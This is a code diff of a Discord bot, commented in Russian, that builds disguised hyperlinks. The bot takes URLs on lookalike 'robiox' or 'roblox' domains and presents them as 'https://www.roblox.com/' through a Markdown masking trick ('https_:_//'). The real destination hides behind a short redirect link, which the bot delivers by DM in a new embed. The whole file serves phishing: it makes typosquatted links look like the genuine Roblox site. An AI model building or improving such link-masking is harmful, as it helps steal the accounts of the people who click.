@@ -6,7 +6,7 @@ const app = express();
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
 const linksDb = {};
 
-// Заглушка для главной страницы (чтобы UptimeRobot не показывал 404)
+// Заглушка для главной страницы (чтобы сервер оставался "теплым")
 app.get('/', (req, res) => {
     res.send('Бот активен!');
 });
@@ -48,22 +48,32 @@ client.on('interactionCreate', async (interaction) => {
         const shortUrl = `${process.env.BASE_URL}/r/${id}`;
         const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');
 
-        // Отвечаем в канале, чтобы закрыть модалку
+        // 1. Ответ в канал (как раньше)
         await interaction.reply({ 
-            content: `✅ Ссылка отправлена вам в личные сообщения!`, 
+            content: `Check your DMs!`, 
             flags: [MessageFlags.Ephemeral] 
         });
 
-        // Отправляем ссылку в ЛС
+        // 2. Формируем Embed с вашим цветом 0x274666
+        const embed = {
+            color: 0x274666,
+            title: '🔗 Hyperlink Generated',
+            description: 'Your link is ready! Click on the code block below to copy it',
+            fields: [
+                {
+                    name: 'Link',
+                    value: `\`[${visualUrl}](${shortUrl})\``
+                }
+            ]
+        };
+
+        // 3. Отправляем в ЛС
         try {
-            await interaction.user.send({ 
-                content: `✅ Ваша скрытая ссылка готова:\n\`[${visualUrl}](${shortUrl})\`` 
-            });
+            await interaction.user.send({ embeds: [embed] });
         } catch (error) {
             console.error('Не удалось отправить ЛС:', error);
-            // Если ЛС закрыты, отправляем в канал как скрытое сообщение
             await interaction.followUp({ 
-                content: `⚠️ Не удалось отправить ЛС (у вас закрыты сообщения). Вот ваша ссылка: \`[${visualUrl}](${shortUrl})\``, 
+                content: `⚠️ Не удалось отправить ЛС. Вот ваша ссылка: \`[${visualUrl}](${shortUrl})\``, 
                 flags: [MessageFlags.Ephemeral] 
             });
         }
